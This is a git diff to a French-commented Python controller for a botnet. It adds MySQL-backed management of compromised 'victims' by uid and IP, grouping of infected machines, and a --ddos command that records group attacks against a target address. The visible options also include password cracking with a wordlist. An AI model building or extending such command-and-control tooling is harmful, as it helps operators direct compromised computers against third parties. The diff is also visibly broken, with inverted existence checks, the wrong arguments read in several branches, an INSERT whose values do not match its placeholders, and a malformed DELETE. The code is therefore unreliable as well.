@@ -3,6 +3,7 @@ from env import *
 import threading
 import argparse
 from queue import Queue
+import mysql.connector
 
 
 
@@ -36,6 +37,30 @@ def reception(conn, addr):
             break
         print(f" Client: {data.decode()}")
 
+
+
+
+def group_exists(group_name):
+    query = "SELECT * FROM groups WHERE name = %s"
+    values = (group_name, )
+
+    mycursor.execute(query, values)
+    result = mycursor.fetchall()
+
+    return len(result) > 0
+
+
+def get_group_id(group_name):
+    query = "SELECT id FROM groups WHERE name = %s"
+    values = (group_name, )
+
+    mycursor.execute(query, values)
+    result = mycursor.fetchall()
+
+    if len(result) < 1:
+        return None
+    else:
+        return result[0][0]
 
 
 # Fin fonctions
@@ -101,7 +126,9 @@ parser.add_argument("--wordlist", type=str, help="wordlist")
 # Gestion des groupes
 action_group.add_argument("--list-host", action="store_true", help="Montre la liste des ordinateurs")
 action_group.add_argument("--list-group", type=str, help="Montre la liste des groupes d'ordinateurs")
-action_group.add_argument("--create-group", nargs=2, type=str, help="Créer un groupe d'ordinateurs")
+action_group.add_argument("--create-group", nargs=2, type=str, help="Créer un groupe d'ordinateurs. Le premier argument est le nom du groupe, le second est la liste des ordinateurs séparés par des virgules (ex: '1232,9849')")
+action_group.add_argument("--add-to-group", nargs=2, type=str, help="Ajoute des ordinateurs à un groupe. Le premier argument est le nom du groupe, le second est la liste des ordinateurs séparés par des virgules (ex: '1232,9849')")
+action_group.add_argument("--remove-from-group", nargs=2, type=str, help="Retire des ordinateurs d'un groupe. Le premier argument est le nom du groupe, le second est la liste des ordinateurs séparés par des virgules (ex: '1232,9849')")
 action_group.add_argument("--delete-group", type=str, help="Supprime un groupe d'ordinateurs")
 
 
@@ -111,17 +138,50 @@ group_or_host.add_argument("-G", "--group", type=str, help="permet de sélection
 group_or_host.add_argument("-H", "--host", type=str, help="permet de sélectionner un ordinateur. Pour sélectionner plusieurs hosts, il faut les séparer par des virgules")
 
 
-
-
 args = parser.parse_args()
+
+
+
+
+# Database
+db = mysql.connector.connect(
+    host=DBHOST,
+    user=DBUSER,
+    password=DBPASSWORD,
+    database=DB
+)
+
+
+mycursor = db.cursor()
+
+
 
 if args.ddos:
     if not args.address or not args.time:
         parser.error("--ddos nécessite les arguments --address et --time")
     elif not args.host and not args.group:
-        parser.error("--scan nécessite l'argument --host et/ou --group")
+        parser.error("--ddos nécessite l'argument --host et/ou --group")
 
     print("ddos sur " + args.address + " pendant " + args.time + " secondes")
+
+    # Parsing des attaquants
+    for group in args.group.split(","):
+        query = "SELECT * FROM groups WHERE name = %s"
+        values = (group,)
+        mycursor.execute(query, values)
+        result = mycursor.fetchall()
+        print(result)
+
+    # Récupération de l'id du groupe
+    query = "SELECT id FROM groups WHERE name = %s"
+    values = (args.group,)
+
+
+    # Ajout de l'attaque en bdd
+    query = "INSERT INTO group_attacks (group_id, type, state, text) VALUES (%s, %s, %s, %s)"
+    values = (uid, addr[0], base64.b64encode(sym_key).decode(), base64.b64encode("test".encode()).decode(), True, True)
+
+    mycursor.execute(query, values)
 
 
 elif args.crack:
@@ -184,16 +244,56 @@ elif args.no_multi_task:
         parser.error("--no-multi-task nécessite l'argument --host et/ou --group")
     elif args.multi_task:
         parser.error("--no-multi-task et --multi-task sont mutuellement exclusifs")
-    print("désactivation du mode multi-task sur " + args.host + " et/ou " + args.group)
+        
+    else:
+        print("désactivation du mode multi-task sur " + args.host + " et/ou " + args.group)
+
 
 
 elif args.list_host:
     if args.host:
         parser.error("--list-host n'accepte pas l'argument --host")
+
     elif args.group:
         print("liste des ordinateurs du groupe " + args.group)
+
+        group_name = args.create_group[0]
+
+
+        # Vérification de l'existence du groupe
+        if group_exists(group_name):
+            print("Le groupe n'existe pas")
+            exit(1)
+
+        # Récupération des ordinateurs du groupe
+        query = "SELECT uid, ip FROM victims WHERE id IN (SELECT victim_id FROM victim_groups WHERE group_id = (SELECT id FROM groups WHERE name = %s))"
+        values = (group_name, )
+
+        mycursor.execute(query, values)
+
+        result = mycursor.fetchall()
+        nb_victims = len(result)
+
+        print("Il y a " + str(nb_victims) + " ordinateurs dans le groupe " + group_name)
+        for victim in result:
+            print(victim[0] + " - " + victim[1])
+
+
     else:
         print("liste des ordinateurs du botnet")
+
+        # Récupération des ordinateurs
+        query = "SELECT uid, ip FROM victims"
+
+        mycursor.execute(query)
+
+        result = mycursor.fetchall()
+        nb_victims = len(result)
+
+        print("Il y a " + str(nb_victims) + " ordinateurs dans le botnet")
+        for victim in result:
+            print(victim[0] + " - " + victim[1])
+
 
 
 elif args.list_group:
@@ -202,19 +302,184 @@ elif args.list_group:
     else:
         print("liste des groupes d'ordinateurs")
 
+        group_name = args.create_group[0]
+
+
+        # Vérification de l'existence du groupe
+        if group_exists(group_name):
+            print("Le groupe n'existe pas")
+            exit(1)
+
+
+        # Récupération des groupe
+        query = "SELECT name FROM groups"
+
+        mycursor.execute(query)
+
+        result = mycursor.fetchall()
+        nb_groups = len(result)
+
+        print("Il y a " + str(nb_groups) + " groupes")
+        for group in result:
+            print(group[0])
+
+
 
 elif args.create_group:
     if args.host or args.group:
         parser.error("--create-group n'accepte pas les arguments --host et --group")
+
     else:
         print("création du groupe " + args.create_group[0] + " avec les ordinateurs " + args.create_group[1])
+
+        group_name = args.create_group[0]
+
+
+        # Vérification de l'existence du groupe
+        if group_exists(group_name):
+            print("Le groupe existe déjà")
+            exit(1)
+
+
+        # Création du groupe
+        query = "INSERT INTO groups (name, image, created_at, updated_at) VALUES (%s, 'default.png', CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+        values = (group_name, )
+
+        mycursor.execute(query, values)
+
+
+        # Récupération des ordinateurs à ajouter au groupe
+        victims_list = []
+
+        for victim in args.create_group[1].split(","):
+            query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+            values = (victim, victim, victim)
+
+            mycursor.execute(query, values)
+            result = mycursor.fetchall()
+
+            for id in result:
+                victims_list.append(id[0])
+
+
+        # Ajout des ordinateurs au groupe
+        for victim_id in victims_list:
+            query = "INSERT INTO victim_groups (group_id, victim_id) VALUES ((SELECT id FROM groups WHERE name = %s), %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+            values = (group_name, victim_id)
+
+            mycursor.execute(query, values)
+
+
+
+elif args.add_to_group:
+    if args.host or args.group:
+        parser.error("--add-to-group n'accepte pas les arguments --host et --group")
+
+    else:
+        print("ajout des ordinateurs " + args.add_to_group[1] + " au groupe " + args.add_to_group[0])
+
+        group_name = args.add_to_group[0]
+
+        # Vérification de l'existence du groupe
+        if not group_exists(group_name):
+            print("Le groupe n'existe pas")
+            exit(1)
+        else:
+            # Récupération des ordinateurs à ajouter au groupe
+            victims_list = []
+
+            for victim in args.add_to_group[1].split(","):
+                query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+                values = (victim, victim, victim)
+
+                mycursor.execute(query, values)
+                result = mycursor.fetchall()
+
+                for id in result:
+                    victims_list.append(id[0])
+
+
+            # Ajout des ordinateurs au groupe
+            for victim_id in victims_list:
+                query = "INSERT INTO victim_groups (group_id, victim_id, created_ad, updated_at) VALUES ((SELECT id FROM groups WHERE name = %s), %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+                values = (group_name, victim_id)
+
+                mycursor.execute(query, values)
+
+            
+
+elif args.remove_from_group:
+    if args.host or args.group:
+        parser.error("--remove-from-group n'accepte pas les arguments --host et --group")
+
+    else:
+        print("suppression des ordinateurs " + args.remove_from_group[1] + " du groupe " + args.remove_from_group[0])
+
+        group_name = args.remove_from_group[0]
+
+        # Vérification de l'existence du groupe
+        if not group_exists(group_name):
+            print("Le groupe n'existe pas")
+            exit(1)
+
+        else:
+            # Récupération des ordinateurs à retirer au groupe
+            victims_list = []
+
+            for victim in args.remove_from_group[1].split(","):
+                query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+                values = (victim, victim, victim)
+
+                mycursor.execute(query, values)
+                result = mycursor.fetchall()
+
+                for id in result:
+                    victims_list.append(id[0])
+
+
+            # Retrait des ordinateurs au groupe
+            for victim_id in victims_list:
+                query = "DELETE FROM victim_groups WHERE victim_id = %s)"
+                values = (victim_id)
+
+                mycursor.execute(query, values)
+
 
 
 elif args.delete_group:
     if args.host or args.group:
         parser.error("--delete-group n'accepte pas les arguments --host et --group")
+
     else:
         print("suppression du groupe " + args.delete_group)
+
+        group_name = args.delete_group[0]
+
+        # Vérification de l'existence du groupe
+        if not group_exists(group_name):
+            print("Le groupe n'existe pas")
+            exit(1)
+
+        else:
+            # Récupération de l'id du group à supprimer
+            group_id = get_group_id(group_name)
+
+            # Suppression du lien victim/group du groupe à supprimer
+            query = "DELETE FROM victim_groups WHERE group_id = %s"
+            values = (group_id, )
+
+            mycursor.execute(query, values)
+
+            # Suppression du fichier image si ce n'est pas default.png
+
+            ######## à faire
+
+            # Suppression du groupe
+            query = "DELETE FROM groups WHERE id = %s"
+            values = (group_id, )
+
+            mycursor.execute(query, values)
+
 
 
 elif args.start:
@@ -292,6 +557,7 @@ elif args.start:
 
 
 
-
 else :
     parser.error("no action specified. Use -h/--help for help")
+
+db.commit()
